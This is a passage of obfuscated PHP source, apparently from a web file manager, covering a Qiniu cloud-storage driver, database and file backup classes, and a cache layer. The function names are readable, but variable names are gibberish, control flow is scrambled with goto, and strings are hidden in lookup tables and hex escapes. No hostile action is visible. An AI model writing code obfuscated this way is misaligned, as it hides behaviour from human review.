$B¬ßÙ£…[] = $this->folderInfo($eì–¤ĞŠ’Œ, $FÎ‘´à†œé); } } if (isset($F­Ô®äÌ—î[$dŠ¡½•àÊ[1192]])) { foreach ($F­Ô®äÌ—î[$dŠ¡½•àÊ[1192]] as $DíßŞŸºªÅ) { if ($DíßŞŸºªÅ[$dŠ¡½•àÊ[89]] == $bä™®·ã„) { continue; } $D‰ƒŸ¿¨¸[] = $this->fileInfo($DíßŞŸºªÅ[$dŠ¡½•àÊ[89]], $FÎ‘´à†œé, $DíßŞŸºªÅ); } } if ($F™×Õ…‚×Ğ == $dŠ¡½•àÊ[33]) { break; } } return array($dŠ¡½•àÊ[74] => $B¬ßÙ£…, $dŠ¡½•àÊ[73] => $D‰ƒŸ¿¨¸); goto DÉ¼ùæ˜ò¶; dŞ„ê“Âö’: $dŠ¡½•àÊ =& $_SERVER[Ä¿Ş°¨]; $bÜ”±µôÖ÷ = trim($bÜ”±µôÖ÷, $dŠ¡½•àÊ[8]); $bä™®·ã„ = empty($bÜ”±µôÖ÷) ? $dŠ¡½•àÊ[33] : $bÜ”±µôÖ÷ . $dŠ¡½•àÊ[8]; goto e£ìÅ›»´; DÉ¼ùæ˜ò¶: } public function has($e£³ô…–¾³, $CÔêºøÌ¤‚ = false, $c¥ÃÚ…¸·ˆ = true) { goto FÓÚãØèî; BˆÀ„ÂÒ‚ì: if ($CÔêºøÌ¤‚) { return array($aÄƒÛÓ®‚[187] => $CëÕ‚Äª¶°, $aÄƒÛÓ®‚[188] => $d½¦‘Ğôå­); } return !1; goto cêÍ¥™‹Ôù; eØ„ëÚÁÍÙ: $CëÕ‚Äª¶° = 0; $d½¦‘Ğôå­ = 0; while (!0) { list($Dˆ¡§Û‡ò, $CÔŒ‡ŒÈƒ) = $this->bucketManager->listFiles($this->bucket, $A¤ŒĞ‚¹ë, $b‘„ØÃŞÍ®, $FçŠ”‚íÌä, $C¡ô‰ÊÈ‰›); if ($CÔŒ‡ŒÈƒ) { return !1; } $b‘„ØÃŞÍ® = array_key_exists($aÄƒÛÓ®‚[1160], $Dˆ¡§Û‡ò) ? $b‘„ØÃŞÍ® = $Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1191]] : $aÄƒÛÓ®‚[33]; if ($CÔêºøÌ¤‚) { if (!empty($Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1192]])) { $CëÕ‚Äª¶° += count($Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1192]]); } if (!empty($Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1195]])) { $d½¦‘Ğôå­ += count($Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1195]]); } if ($b‘„ØÃŞÍ® === $aÄƒÛÓ®‚[33]) { break; } continue; } if ($c¥ÃÚ…¸·ˆ) { if (!empty($Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1192]])) { return !0; } } else { if (!empty($Dˆ¡§Û‡ò[$aÄƒÛÓ®‚[1195]])) { return !0; } } if ($b‘„ØÃŞÍ® == $aÄƒÛÓ®‚[33]) { break; } } goto BˆÀ„ÂÒ‚ì; FÓÚãØèî: $aÄƒÛÓ®‚ =& $_SERVER[Ä¿Ş°¨]; $e£³ô…–¾³ = trim($e£³ô…–¾³, $aÄƒÛÓ®‚[8]); $A¤ŒĞ‚¹ë = empty($e£³ô…–¾³) ? $aÄƒÛÓ®‚[33] : $e£³ô…–¾³ . $aÄƒÛÓ®‚[8]; goto Aé‘õªÙŒ; Aé‘õªÙŒ: $b‘„ØÃŞÍ® = $aÄƒÛÓ®‚[33]; $FçŠ”‚íÌä = 1000; $C¡ô‰ÊÈ‰› = $aÄƒÛÓ®‚[8]; goto eØ„ëÚÁÍÙ; cêÍ¥™‹Ôù: } public function listAll($CÑÏ¿‚ÀËè) { $dƒèÛÃ‹‡‘ =& $_SERVER[Ä¿Ş°¨]; $CáÙ‘ˆ‰–¶ = $this->fileList($CÑÏ¿‚ÀËè, 1); $BÒó…á•ôÙ = array(); foreach ($CáÙ‘ˆ‰–¶ as $CóÂæ›ô“É) { $BÒó…á•ôÙ[$CóÂæ›ô“É[$dƒèÛÃ‹‡‘[28]]] = $CóÂæ›ô“É[$dƒèÛÃ‹‡‘[77]]; } return $this->listAllFiles($CÑÏ¿‚ÀËè, array_keys($BÒó…á•ôÙ), $BÒó…á•ôÙ); } public function canRead($AŒºÖª‰àª) { return $this->exist($AŒºÖª‰àª) ? !0 : !1; } public function canWrite($D¬ƒŠ¡åº¢) { return $this->exist($D¬ƒŠ¡åº¢) ? !0 : !1; } public function getContent($CÁ¬†”å¬¥) { return $this->fileSubstr($CÁ¬†”å¬¥, 0, -1); } public function setContent($f¯†”ĞÕÏµ, $aé±ˆá‡ƒğ = '') { $aùˆ‚·Ê¥ñ = $this->tempFile($this->pathThis($f¯†”ĞÕÏµ)); file_put_contents($aùˆ‚·Ê¥ñ, $aé±ˆá‡ƒğ); if ($this->upload($f¯†”ĞÕÏµ, $aùˆ‚·Ê¥ñ)) { $this->tempFileRemve($aùˆ‚·Ê¥ñ); return !0; } return !1; } public function refreshUrls($eÕ×ÍÏÁ¥) { goto Cä§ÌøÔÍµ; Cä§ÌøÔÍµ: $f³±ÃêÊ±İ =& $_SERVER[Ä¿Ş°¨]; $AÇ¡Æ‰öô® = array(); if (is_array($eÕ×ÍÏÁ¥)) { foreach ($eÕ×ÍÏÁ¥ as $eòĞÛÄ§–İ) { $AÇ¡Æ‰öô®[] = $this->link($eòĞÛÄ§–İ); } } else { $AÇ¡Æ‰öô®[] = $this->link($eÕ×ÍÏÁ¥); } goto F×ìò•µ; F×ìò•µ: $f“‹ºƒ°– = new Qiniu\Cdn\CdnManager($this->auth); list($fŒó…íÅÃÄ, $eøÂˆ±¿×±) = $f“‹ºƒ°–->refreshUrls($AÇ¡Æ‰öô®); if ($eøÂˆ±¿×±) { return !1; } goto d¼‡—âÓÍß; d¼‡—âÓÍß: return $fŒó…íÅÃÄ[$f³±ÃêÊ±İ[1196]] == $f³±ÃêÊ±İ[690] ? !0 : !1; goto eßŸ˜×æ½Ä; eßŸ˜×æ½Ä: } public function fileSubstr($eÕ¿‹äÕº“, $bôÒÔ¨Ç·š, $Fñçó¢…¯è) { $Bé·õ¦ƒÙå =& $_SERVER[Ä¿Ş°¨]; if (!($EÅæªåš“¹ = $this->link($eÕ¿‹äÕº“))) { return !1; } $DÚøÌòŒ˜ê = !1; if ($Fñçó¢…¯è > 0) { $e¬ËŞçìñŞ = $bôÒÔ¨Ç·š + $Fñçó¢…¯è - 1; $DÚøÌòŒ˜ê = array($Bé·õ¦ƒÙå[1197] . $bôÒÔ¨Ç·š . $Bé·õ¦ƒÙå[416] . $e¬ËŞçìñŞ); } $f§ŠÈÖ = url_request($EÅæªåš“¹, $Bé·õ¦ƒÙå[212], !1, $DÚøÌòŒ˜ê); return $f§ŠÈÖ[$Bé·õ¦ƒÙå[683]] ? $f§ŠÈÖ[$Bé·õ¦ƒÙå[1019]] : !1; } public function upload($D‹ÙêŞå‡, $e¡íç ê¹¹, $eã†Ä½”Û = false, $F¬óªõç›¼ = REPEAT_REPLACE) { $a›Çˆ†ìù = new Qiniu\Storage\UploadManager(); $BÁÂ±äİô = $this->auth->uploadToken($this->bucket, $D‹ÙêŞå‡); $cãÂø©³±Š = get_file_mime(get_path_ext($e¡íç ê¹¹)); list($CÂáèİÁ¡Ó, $b©ÃŠ”ÉôÖ) = $a›Çˆ†ìù->putFile($BÁÂ±äİô, $D‹ÙêŞå‡, $e¡íç ê¹¹, null, $cãÂø©³±Š); return $b©ÃŠ”ÉôÖ ? !1 : $this->getPathOuter($D‹ÙêŞå‡); } public function uploadFormData($Aå‹±º¹ÓÖ, $B‚ĞºåæöÜ = 3600) { return $this->uploadToken($Aå‹±º¹ÓÖ, $B‚ĞºåæöÜ); } public function multiUploadFormData($C›½÷ Öƒ†, $Eµ½¤°†¢Â = 3600) { return $this->uploadToken($C›½÷ Öƒ†, $Eµ½¤°†¢Â); } private function uploadToken($FáÇåõÏ‡, $c´¢¿‡æ›Ú = 3600) { goto bÕ«İù ƒ‰; bÕ«İù ƒ‰: $d¤‰êá´ê =& $_SERVER[Ä¿Ş°¨]; $BÑîî¦ÇØ² = $c´¢¿‡æ›Ú; $Fî°•¬Œ½ = array($d¤‰êá´ê[1198] => $d¤‰êá´ê[1199]); goto A¿š‘ã‚¨ˆ; fÌÜöî¸”: $D™¦´§²Ô = http_type() . "\x3a\57\57\165\x70\154\157\141\x64{$B­°„ğ°ª}\x2e\x71\151\156\x69\x75\160\x2e\143\x6f\x6d\57"; return array($d¤‰êá´ê[1201] => $bƒƒÖâ­ĞË, $d¤‰êá´ê[1202] => $D™¦´§²Ô); goto côÉ·¼œê¶; A¿š‘ã‚¨ˆ: $DäË„‹¹÷ = null; $bƒƒÖâ­ĞË = $this->auth->uploadToken($this->bucket, $DäË„‹¹÷, $BÑîî¦ÇØ², $Fî°•¬Œ½, !0); $B­°„ğ°ª = empty($this->region) || $this->region == $d¤‰êá´ê[1200] ? $d¤‰êá´ê[33] : $d¤‰êá´ê[416] . $this->region; goto fÌÜöî¸”; côÉ·¼œê¶: } public function download($d³·„á¢×, $A×Ë—‚á) { goto cæ × ; bõ‹äÃË‰: $FŒ‚Å‚æŒ÷ = 1024 * 200; $B‡èÊ—â = fopen($Dğ–°ôÉï, $_SERVER[Ä¿Ş°¨][1203]); while (!0) { $BŞ¾ë‡ß¿… = $this->fileSubstr($d³·„á¢×, $fÙ’©¸÷¼£, $FŒ‚Å‚æŒ÷); if ($BŞ¾ë‡ß¿… === !1) { return !1; } fwrite($B‡èÊ—â, $BŞ¾ë‡ß¿…); $fÙ’©¸÷¼£ += $FŒ‚Å‚æŒ÷; if (strlen($BŞ¾ë‡ß¿…) < $FŒ‚Å‚æŒ÷) { break; } } goto CÃÀ†“À’; CÃÀ†“À’: fclose($B‡èÊ—â); return $A×Ë—‚á; goto b˜šĞ²‡ª; cæ × : $Dğ–°ôÉï = IO::getPathInner(IO::mkfile($A×Ë—‚á)); if (!($a‰Âí‘’È = $this->link($d³·„á¢×))) { return !1; } $fÙ’©¸÷¼£ = 0; goto bõ‹äÃË‰; b˜šĞ²‡ª: } public function link($eóï•óÚÉ¿, $A³»…“š•ˆ = '') { if (!$this->isFile($eóï•óÚÉ¿)) { return !1; } $FŒ–¹¢Î·¸ = $this->getHost() . $_SERVER[Ä¿Ş°¨][8] . $this->pathEncode($eóï•óÚÉ¿) . $A³»…“š•ˆ; return $this->auth->privateDownloadUrl($FŒ–¹¢Î·¸, 3600 * 12); } public function fileOut($f¶¯áò  ÷, $fê·¹Üïº‰ = false, $eİ°öÇ·Ìï = false, $FÖŠÍ®àÄİ = '') { $Aë¨¿ùİ¹× =& $_SERVER[Ä¿Ş°¨]; if (!$eİ°öÇ·Ìï) { $eİ°öÇ·Ìï = $this->pathThis($f¶¯áò  ÷); } $bÈÄ»Â© = $fê·¹Üïº‰ ? $Aë¨¿ùİ¹×[1204] . rawurlencode($eİ°öÇ·Ìï) : $Aë¨¿ùİ¹×[33]; $BÙîÛŠàä™ = $this->link($f¶¯áò  ÷, $bÈÄ»Â©); $this->fileOutLink($BÙîÛŠàä™); } public function fileOutServer($BšÊÊ»‚á, $a‚»›è‹éù = false, $C–‡½ºÖå– = false, $D¼ÊÌóí¦á = '') { parent::fileOut($BšÊÊ»‚á, $a‚»›è‹éù, $C–‡½ºÖå–, $D¼ÊÌóí¦á); } public function fileOutImage($C®Ôß›½š, $e­æƒ–Æİ = 250) { $F’Ë©©ãÄ = $this->link($C®Ôß›½š, $_SERVER[Ä¿Ş°¨][1205] . $e­æƒ–Æİ); $this->fileOutLink($F’Ë©©ãÄ); } public function fileOutImageServer($DŞÖÅ‹áÑå, $eä‡±Ş½Éè = 250) { parent::fileOutImage($DŞÖÅ‹áÑå, $eä‡±Ş½Éè); } public function hashMd5($D…ù•©‡›) { $E›ÄÄ’¡Î =& $_SERVER[Ä¿Ş°¨]; $f‘¹±‹”äÈ = $this->objectMeta($D…ù•©‡›); return isset($f‘¹±‹”äÈ[$E›ÄÄ’¡Î[192]]) ? $f‘¹±‹”äÈ[$E›ÄÄ’¡Î[192]] : !1; $bò²àÉ†Õì = $this->link($D…ù•©‡›, $E›ÄÄ’¡Î[1206]); } public function size($FôŠÇğñ¢) { $eÒˆ†³Ã® = $this->objectMeta($FôŠÇğñ¢); return $eÒˆ†³Ã® ? $eÒˆ†³Ã®[$_SERVER[Ä¿Ş°¨][77]] : 0; } public function info($E£š¸›ğ¡) { if ($this->isFolder($E£š¸›ğ¡)) { return $this->folderInfo($E£š¸›ğ¡); } else { if ($this->isFile($E£š¸›ğ¡)) { return $this->fileInfo($E£š¸›ğ¡); } } return !1; } public function exist($D†ƒ§¼İ) { return $this->isFile($D†ƒ§¼İ) || $this->isFolder($D†ƒ§¼İ); } public function isFile($eÌğŒ·šÄ†) { return !$this->isFolder($eÌğŒ·šÄ†) && $this->objectMeta($eÌğŒ·šÄ†); } public function isFolder($B”¥Ô‘‰ÇÏ) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][219], $B”¥Ô‘‰ÇÏ); } protected function objectMeta($fçİ©Àä¬Ì) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][220], $fçİ©Àä¬Ì); } protected function _objectMeta($fÌÛ„ëÂâ) { $a´õë’îß† =& $_SERVER[Ä¿Ş°¨]; list($BÌØ—³±¯¢, $F’µëƒËš) = $this->bucketManager->stat($this->bucket, $fÌÛ„ëÂâ); if ($BÌØ—³±¯¢) { $BÌØ—³±¯¢[$a´õë’îß†[77]] = intval($BÌØ—³±¯¢[$a´õë’îß†[1193]]); } return $BÌØ—³±¯¢; } protected function _isFolder($A„Ì±Ú¨ï«) { $A¡¯Œ™—› =& $_SERVER[Ä¿Ş°¨]; list($BÇÈÇ¾Çµö, $a­ÄêÛÇ) = $this->bucketManager->listFiles($this->bucket, trim($A„Ì±Ú¨ï«, $A¡¯Œ™—›[8]) . $A¡¯Œ™—›[8], $A¡¯Œ™—›[33], 1, $A¡¯Œ™—›[8]); return !empty($BÇÈÇ¾Çµö[$A¡¯Œ™—›[1192]]) || !empty($BÇÈÇ¾Çµö[$A¡¯Œ™—›[1195]]) ? !0 : !1; } } goto D“Œ©ˆ‰Ü; A„­«õ’˜“: class BackupDbFile { public function __construct() { } public function index() { goto FåäâÔ†á†; Dì˜Òœç: Backup::set(array($CÃåÖŠØëù[725] => $a¬¨ğîõ¹Û[$CÃåÖŠØëù[77]])); IO::move($bˆƒ¦˜Ù, $Fô‘åˆº‹È); $AÁî‚öÈî² = CONTROLLER_DIR . $CÃåÖŠØëù[726]; goto cËïÃÑ„éä; e®íÎÛø‹à: return !0; goto cÒåï”ÚÁ; cÓÓõŞ¨Ö°: $E‘£âö‹æé = new TaskFileTransfer($CÃåÖŠØëù[723], $CÃåÖŠØëù[706], 0, LNG($CÃåÖŠØëù[707]) . $CÃåÖŠØëù[416] . LNG($CÃåÖŠØëù[709]) . $CÃåÖŠØëù[724]); $E‘£âö‹æé->addPath($bˆƒ¦˜Ù); $a¬¨ğîõ¹Û = IO::infoWithChildren($bˆƒ¦˜Ù); goto Dì˜Òœç; cËïÃÑ„éä: IO::copy($AÁî‚öÈî², $Fô‘åˆº‹È . "\x62\141\x63\x6b\165\x70\137{$FÎ´ÄëìçØ}\57"); $E‘£âö‹æé->end(); Backup::set(array($CÃåÖŠØëù[727] => $a¬¨ğîõ¹Û[$CÃåÖŠØëù[77]])); goto e®íÎÛø‹à; a©îÈŸÙø‹: $bˆƒ¦˜Ù = TEMP_FILES . "\x62\141\143\153\x75\160\137{$FÎ´ÄëìçØ}\x2f"; $Fô‘åˆº‹È = "\173\x69\x6f\72{$dÊŞù±ÀŞ«[$CÃåÖŠØëù[685]]}\x7d\x2f\x64\x61\164\x61\x62\141\163\x65\57"; IO::mkdir($Fô‘åˆº‹È . "\142\x61\x63\153\x75\160\137{$FÎ´ÄëìçØ}\57"); goto cÓÓõŞ¨Ö°; FåäâÔ†á†: $CÃåÖŠØëù =& $_SERVER[Ä¿Ş°¨]; $dÊŞù±ÀŞ« = Backup::get(); $FÎ´ÄëìçØ = $dÊŞù±ÀŞ«[$CÃåÖŠØëù[28]]; goto a©îÈŸÙø‹; cÒåï”ÚÁ: } } class BackupFile { public function __construct() { } public function index() { goto fÀ’Ñä•¬õ; FÔ»ê¡Ÿ°¨: $BîÎŞ”ÓÅ = $FÖÚèˆ†¯Ü ? 1 : 0; $B˜ÒÊÌ³» = array($_SERVER[Ä¿Ş°¨][744] => 1, $_SERVER[Ä¿Ş°¨][697] => time(), $_SERVER[Ä¿Ş°¨][703] => $BîÎŞ”ÓÅ, $_SERVER[Ä¿Ş°¨][741] => $A³£ôÕğ©‘, $_SERVER[Ä¿Ş°¨][733] => $EÆùåÂ›ìÈ, $_SERVER[Ä¿Ş°¨][732] => $D¥µ†‡êˆß); if ($Fá´†Îãº) { $B˜ÒÊÌ³»[$_SERVER[Ä¿Ş°¨][742]] = $bÏ°åÔÄ; $B˜ÒÊÌ³»[$_SERVER[Ä¿Ş°¨][743]] = $F£’ğíó×±; } goto EÃ–’’£Ë; FŞ»ùç¯¬Ş: $AÜ©§‚ŞŸ = 1000; $EğíÍªß´ = $Fá´†Îãº = 0; $A¡é‡ˆÌƒ© = array(); goto C×¨Ï–œÊ“; EŒÄÕ©¹…: $D¥µ†‡êˆß = (int) Model($_SERVER[Ä¿Ş°¨][713])->where($c•Ï‰ù®‰•)->count($_SERVER[Ä¿Ş°¨][423]); $EÆùåÂ›ìÈ = (int) Model($_SERVER[Ä¿Ş°¨][713])->where($c•Ï‰ù®‰•)->sum($_SERVER[Ä¿Ş°¨][77]); $cãÌ¬‚£æ = new TaskFileTransfer($_SERVER[Ä¿Ş°¨][730], $_SERVER[Ä¿Ş°¨][706], $D¥µ†‡êˆß, LNG($_SERVER[Ä¿Ş°¨][707]) . $_SERVER[Ä¿Ş°¨][708] . LNG($_SERVER[Ä¿Ş°¨][731])); goto bÏóãŒîîî; bÏóãŒîîî: $cãÌ¬‚£æ->task[$_SERVER[Ä¿Ş°¨][692]] = $EÆùåÂ›ìÈ; $B˜ÒÊÌ³» = array($_SERVER[Ä¿Ş°¨][732] => $D¥µ†‡êˆß, $_SERVER[Ä¿Ş°¨][733] => $EÆùåÂ›ìÈ); Backup::set($B˜ÒÊÌ³»); goto a·Ÿİ‹©ä´; fÀ’Ñä•¬õ: $cƒÃ¡ÎÀöÆ = Backup::get(); $A³£ôÕğ©‘ = $cƒÃ¡ÎÀöÆ[$_SERVER[Ä¿Ş°¨][277]][$_SERVER[Ä¿Ş°¨][163]][$_SERVER[Ä¿Ş°¨][423]]; $c•Ï‰ù®‰• = array($_SERVER[Ä¿Ş°¨][424] => array($_SERVER[Ä¿Ş°¨][728], $A³£ôÕğ©‘), $_SERVER[Ä¿Ş°¨][729] => array($_SERVER[Ä¿Ş°¨][315], $cƒÃ¡ÎÀöÆ[$_SERVER[Ä¿Ş°¨][685]])); goto EŒÄÕ©¹…; a·Ÿİ‹©ä´: $FÖÚèˆ†¯Ü = !0; $fæ¡‰ƒ‹ªœ = $this->storeIds(); $aĞÅÊÚøÂ™ = 1; goto FŞ»ùç¯¬Ş; C×¨Ï–œÊ“: $F£’ğíó×± = $bÏ°åÔÄ = 0; do { $E¨»ƒ›Äöœ = $_SERVER[Ä¿Ş°¨][734]; $a°»ç·ŠÜ = Model($_SERVER[Ä¿Ş°¨][713])->where($c•Ï‰ù®‰•)->field($E¨»ƒ›Äöœ)->order($_SERVER[Ä¿Ş°¨][735])->selectPage($AÜ©§‚ŞŸ, $aĞÅÊÚøÂ™); $E¶Ê¯Æ°» = !empty($a°»ç·ŠÜ[$_SERVER[Ä¿Ş°¨][350]]) ? $a°»ç·ŠÜ[$_SERVER[Ä¿Ş°¨][350]] : array(); foreach ($E¶Ê¯Æ°» as $fæàğŒçÂ¡) { goto a÷®«¦äÉ×; a‰Â§Ûí†: if (IO::exist($eÛÜÑİ±Â¡)) { $cãÌ¬‚£æ->updateFileEnd($fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][28]], $fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][77]]); } else { $eÛÜÑİ±Â¡ = get_path_father($eÛÜÑİ±Â¡); IO::mkdir($eÛÜÑİ±Â¡); if (!IO::copy($FßÊóŠã…‡, $eÛÜÑİ±Â¡, $_SERVER[Ä¿Ş°¨][738])) { write_log($_SERVER[Ä¿Ş°¨][739] . $FßÊóŠã…‡ . $_SERVER[Ä¿Ş°¨][740] . $eÛÜÑİ±Â¡ . $_SERVER[Ä¿Ş°¨][480], $_SERVER[Ä¿Ş°¨][706]); $FÖÚèˆ†¯Ü = !1; break; } } $A³£ôÕğ©‘ = $fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][423]]; $Fá´†Îãº += 1; goto fÒÒŒõà›Ê; fÒÒŒõà›Ê: $EğíÍªß´ += $fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][77]]; $bÏ°åÔÄ += 1; $F£’ğíó×± += $fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][77]]; goto a†×ÎŸ¼ĞÛ; a†×ÎŸ¼ĞÛ: if ($EğíÍªß´ >= 1024 * 1024 * 100) { $B˜ÒÊÌ³» = array($_SERVER[Ä¿Ş°¨][741] => $A³£ôÕğ©‘, $_SERVER[Ä¿Ş°¨][742] => $bÏ°åÔÄ, $_SERVER[Ä¿Ş°¨][743] => $F£’ğíó×±); Backup::set($B˜ÒÊÌ³»); $EğíÍªß´ = $Fá´†Îãº = 0; } goto dƒ¢è‚Ì÷; a÷®«¦äÉ×: if (!$this->_fileExist($fæàğŒçÂ¡, $A¡é‡ˆÌƒ©, $fæ¡‰ƒ‹ªœ)) { $D¥µ†‡êˆß -= 1; $EÆùåÂ›ìÈ -= (int) $fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][77]]; write_log("\x66\151\154\x65\40\156\x6f\x74\x20\145\170\x69\163\x74\x2e\146\151\154\145\x49\104\72{$fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][423]]}\x2c\x20\x70\141\x74\150\x3a{$fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][75]]}", $_SERVER[Ä¿Ş°¨][736]); continue; } $FßÊóŠã…‡ = $fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][75]]; $eÛÜÑİ±Â¡ = "\x7b\151\157\x3a{$cƒÃ¡ÎÀöÆ[$_SERVER[Ä¿Ş°¨][685]]}\x7d" . substr($FßÊóŠã…‡, strlen("\173\x69\157\72{$fæàğŒçÂ¡[$_SERVER[Ä¿Ş°¨][737]]}\175")); goto a‰Â§Ûí†; dƒ¢è‚Ì÷: } $c—–ÄĞš‡  = count($E¶Ê¯Æ°»); $aĞÅÊÚøÂ™++; } while ($c—–ÄĞš‡  == $AÜ©§‚ŞŸ); $cãÌ¬‚£æ->end(); goto FÔ»ê¡Ÿ°¨; EÃ–’’£Ë: Backup::set($B˜ÒÊÌ³»); $this->_fileFilter($A¡é‡ˆÌƒ©); return !0; goto Aïåîöá®; Aïåîöá®: } private function _fileExist($cŸšãÉ‹¥Ğ, &$aËœœÄ¡äš, $DÃÎ»Ö†êÈ) { goto fŒùÏ•ÍÜ‘; fŒùÏ•ÍÜ‘: $eØˆ©ˆÉáò =& $_SERVER[Ä¿Ş°¨]; $EÛ¤ªƒ˜¯› = $cŸšãÉ‹¥Ğ[$eØˆ©ˆÉáò[75]]; if (in_array($cŸšãÉ‹¥Ğ[$eØˆ©ˆÉáò[423]], $aËœœÄ¡äš)) { return !1; } goto E½ÀøÆŠõ; cºéêØÉàğ: if (IO::exist($B…¤´ˆÚº±)) { $aËœœÄ¡äš[] = $cŸšãÉ‹¥Ğ[$eØˆ©ˆÉáò[423]]; return !1; } $AöÑ¥¸­™é = array($eØˆ©ˆÉáò[737] => $cŸšãÉ‹¥Ğ[$eØˆ©ˆÉáò[737]], $eØˆ©ˆÉáò[75] => array($eØˆ©ˆÉáò[745], "{$B…¤´ˆÚº±}\45")); $f«ÙâåƒŠ  = Model($eØˆ©ˆÉáò[713])->where($AöÑ¥¸­™é)->field($eØˆ©ˆÉáò[424])->select(); goto A’µßÍÃ©î; A’µßÍÃ©î: $aËœœÄ¡äš = array_merge($aËœœÄ¡äš, array_to_keyvalue($f«ÙâåƒŠ , $eØˆ©ˆÉáò[33], $eØˆ©ˆÉáò[423])); return !1; goto dóÙÃãœÓ; E½ÀøÆŠõ: if (!in_array($cŸšãÉ‹¥Ğ[$eØˆ©ˆÉáò[737]], $DÃÎ»Ö†êÈ)) { return !1; } if (IO::exist($EÛ¤ªƒ˜¯›)) { return !0; } $B…¤´ˆÚº± = get_path_father($EÛ¤ªƒ˜¯›); goto cºéêØÉàğ; dóÙÃãœÓ: } private function _fileFilter($Fó½ã´Èøö) { $EªÑ¸¿ôñ =& $_SERVER[Ä¿Ş°¨]; if (empty($Fó½ã´Èøö)) { return; } $c¹æ¥«Ú” = array($EªÑ¸¿ôñ[423] => array($EªÑ¸¿ôñ[7], array_unique($Fó½ã´Èøö))); $bàãï£¦Ğâ = Model($EªÑ¸¿ôñ[746])->where($c¹æ¥«Ú”)->field($EªÑ¸¿ôñ[374])->select(); foreach ($bàãï£¦Ğâ as $eéÊÉç²ù) { Model($EªÑ¸¿ôñ[746])->remove($eéÊÉç²ù[$EªÑ¸¿ôñ[374]], !1); } } private function storeIds() { $a¨±°ì“­’ =& $_SERVER[Ä¿Ş°¨]; $aÜçÕ·›Š  = Model($a¨±°ì“­’[698])->listData(); return array_to_keyvalue($aÜçÕ·›Š , $a¨±°ì“­’[33], $a¨±°ì“­’[372]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto AÓ×…¢É°; AÓ×…¢É°: $FßÖôØ‰ä =& $_SERVER[Ä¿Ş°¨]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto ağ¨ƒÈ•è; Bƒæä—Œ´î: switch ($fÜéãª—´Æ[$FßÖôØ‰ä[747]]) { case $FßÖôØ‰ä[17]: self::$handle = Model($FßÖôØ‰ä[749]); break; case $FßÖôØ‰ä[750]: self::$handle = new CacheRedis($b«š•Ï•°, $fÊÂ‘óœËÏ); break; case $FßÖôØ‰ä[751]: self::$handle = new CacheMemcached($b«š•Ï•°, $fÊÂ‘óœËÏ); break; case $FßÖôØ‰ä[163]: self::$handle = new CacheFile($b«š•Ï•°, $fÊÂ‘óœËÏ); break; default: break; } return self::$handle; goto c×Š„ø¤—; ağ¨ƒÈ•è: $fÜéãª—´Æ = $GLOBALS[$FßÖôØ‰ä[6]][$FßÖôØ‰ä[333]]; $b«š•Ï•° = $fÜéãª—´Æ[$fÜéãª—´Æ[$FßÖôØ‰ä[747]]]; $fÊÂ‘óœËÏ = $fÜéãª—´Æ[$FßÖôØ‰ä[748]]; goto Bƒæä—Œ´î; c×Š„ø¤—: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($e«¢‡ù§Â‘) { if (is_array($e«¢‡ù§Â‘) || is_object($e«¢‡ù§Â‘)) { $e«¢‡ù§Â‘ = json_encode($e«¢‡ù§Â‘); } $e«¢‡ù§Â‘ = rawurlencode($e«¢‡ù§Â‘); return KOD_SITE_ID . $_SERVER[Ä¿Ş°¨][70] . $e«¢‡ù§Â‘; } public static function get($eÒ¡È§ŒÊ) { $e•¼Âëå›· = self::key($eÒ¡È§ŒÊ); if (!isset(self::$memoryCache[$e•¼Âëå›·])) { $A±³ôšîê = self::init()->get($e•¼Âëå›·); self::$memoryCache[$e•¼Âëå›·] = unserialize($A±³ôšîê); } return self::$memoryCache[$e•¼Âëå›·]; } public static function set($D­´ÒØ°æ›, $EÊöóÓ¿Š‰, $aá‹ëÃ¦¹ = false) { goto D²·ÜÊ„Ä; D²·ÜÊ„Ä: $D¬ÌÔĞŒãØ = self::key($D­´ÒØ°æ›); if (isset(self::$memoryCache[$D¬ÌÔĞŒãØ]) && self::$memoryCache[$D¬ÌÔĞŒãØ] === $EÊöóÓ¿Š‰) { return !0; } if ($aá‹ëÃ¦¹ === 0) { self::$memoryCache[$D¬ÌÔĞŒãØ] = $EÊöóÓ¿Š‰; return !0; } goto a¯¤ƒ½Íá; a“°Ó·ß: CacheLock::unlock($D­´ÒØ°æ›); return $d‚“ ÁÑŸ; goto D£‡Õ¶Æ²; a¯¤ƒ½Íá: CacheLock::lock($D­´ÒØ°æ›); $d‚“ ÁÑŸ = self::init()->set($D¬ÌÔĞŒãØ, serialize($EÊöóÓ¿Š‰), $aá‹ëÃ¦¹); self::$memoryCache[$D¬ÌÔĞŒãØ] = $EÊöóÓ¿Š‰; goto a“°Ó·ß; D£‡Õ¶Æ²: } public static function remove($a ¾šÇáø¤) { goto D¨ª¦½Á¦Å; D‘Ÿò¾œŞ‘: CacheLock::lock($a ¾šÇáø¤); $AÖ•ö–¤êó = self::init()->remove($BíÖ´çœ¬Æ); CacheLock::unlock($a ¾šÇáø¤); goto EÕö­æå; D¨ª¦½Á¦Å: $BíÖ´çœ¬Æ = self::key($a ¾šÇáø¤); unset(self::$memoryCache[$BíÖ´çœ¬Æ]); self::clearTimeout(); goto D‘Ÿò¾œŞ‘; EÕö­æå: return $AÖ•ö–¤êó; goto CÚ¦ŞÍä˜‹; CÚ¦ŞÍä˜‹: } public static function clearMemory($B¹ëËõš‚¬ = false) { if ($B¹ëËõš‚¬) { $B¹ëËõš‚¬ = self::key($B¹ëËõš‚¬); unset(self::$memoryCache[$B¹ëËõš‚¬]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); 